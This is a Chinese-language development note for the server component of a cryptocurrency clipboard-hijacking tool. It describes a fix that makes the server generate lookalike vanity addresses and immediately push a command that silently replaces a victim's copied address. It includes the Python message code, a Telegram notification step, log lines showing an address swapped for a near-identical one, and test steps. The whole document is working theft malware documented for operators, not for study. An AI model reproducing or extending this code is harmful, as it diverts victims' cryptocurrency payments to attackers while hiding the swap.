# 自动生成地址替换功能修复说明

## 问题描述
当设备开启了"自动生成"功能后，服务端会为剪贴板中的加密货币地址生成相似地址，但之前的实现存在以下问题：
- 生成成功后只是保存到数据库和发送到Telegram
- 没有立即将生成的地址替换到客户端的剪贴板
- 变量名错误导致异常（使用了未定义的 `clip_text`）

## 修复内容

### 1. 添加了立即替换功能
在地址生成成功后，立即发送 MUTATION 消息给客户端：

```python
# 立即发送给客户端替换剪贴板
mutation_response = {
    "type": "MUTATION",
    "targetSeq": data.get("seq"),
    "expectedHash": data.get("hash"),
    "deadline": int(time.time() * 1000) + 600,
    "set": {
        "format": "text/plain",
        "text": result['generated_address']
    },
    "suppressReport": True,
    "reason": f"[自动生成] 已生成相似地址"
}
await ws.send_text(json.dumps(mutation_response))
```

### 2. 修复变量名错误
将错误的 `clip_text` 变量改为正确的 `preview` 变量：
```python
print(f"[AUTO-GENERATE] device={device_id} 已发送替换指令: {preview} -> {result['generated_address']}", flush=True)
```

### 3. 跳过后续规则处理
当自动生成成功并发送替换指令后，添加 `continue` 跳过后续的规则处理，避免重复修改。

## 工作流程

1. **客户端复制地址** → 发送到服务端
2. **服务端检查**：
   - 是否为加密货币地址
   - 是否开启了自动生成
3. **调用Vanity服务**生成相似地址
4. **生成成功后**：
   - 保存到数据库
   - **立即发送MUTATION消息给客户端替换剪贴板** ✨ NEW
   - 发送到Telegram通知
   - **跳过后续规则处理** ✨ NEW
5. **客户端接收**到MUTATION消息后自动替换剪贴板内容

## 日志示例

```
[AUTO-GENERATE] device=ABC123 检测到加密地址: TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax
[AUTO-GENERATE] device=ABC123 开始生成相似地址...
[AUTO-GENERATE] device=ABC123 生成成功: TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Bx
[AUTO-GENERATE] device=ABC123 已发送替换指令: TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Ax -> TKzxdSv2FZKQrEqkKVgp5DcwEXBEKMg2Bx
```

## 测试方法

1. 确保设备开启了"自动生成"功能
2. 复制一个加密货币地址到剪贴板
3. 观察客户端剪贴板是否被自动替换为相似地址
4. 检查服务端日志确认替换指令已发送

## 注意事项

- 生成地址需要时间，可能需要几秒到几分钟
- 只有在生成成功后才会替换剪贴板
- 如果生成失败，剪贴板保持原样
- 自动生成的地址会保存到数据库，可在管理界面查看
